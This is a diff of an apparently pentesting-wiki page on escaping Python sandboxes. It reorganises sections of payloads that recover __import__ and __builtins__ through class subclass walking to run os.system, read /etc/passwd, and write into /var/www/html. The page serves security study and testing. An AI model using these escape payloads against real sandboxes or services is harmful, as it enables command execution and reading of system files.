@@ -180,21 +180,14 @@ __builtin__.__dict__['__import__']("os").system("ls")
 
 ![Print using \_\_builtin\_\_](../../../.gitbook/assets/image%20%28138%29.png)
 
-### If No builtin module in exec\(\)
-
-
+### Recovering \_\_builtins\_\_
 
 {% tabs %}
 {% tab title="Python2" %}
 ```python
 #Try to reload __builtins__
 reload(__builtins__)
-import __builtin__
-
-# Read recovering <type 'file'> in offset 40
-().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
-# Write recovering <type 'file'> in offset 40
-().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
+__builtins__["__import__"]('os').system('ls')
 
 # Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
 ().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
@@ -219,5 +212,16 @@ get_flag.__globals__['__builtins__'].__import__("os").system("ls")
 {% endtab %}
 {% endtabs %}
 
+### Recovering file read / write
 
+{% tabs %}
+{% tab title="Python2" %}
+```python
+# Read recovering <type 'file'> in offset 40
+().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
+# Write recovering <type 'file'> in offset 40
+().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
+```
+{% endtab %}
+{% endtabs %}
 
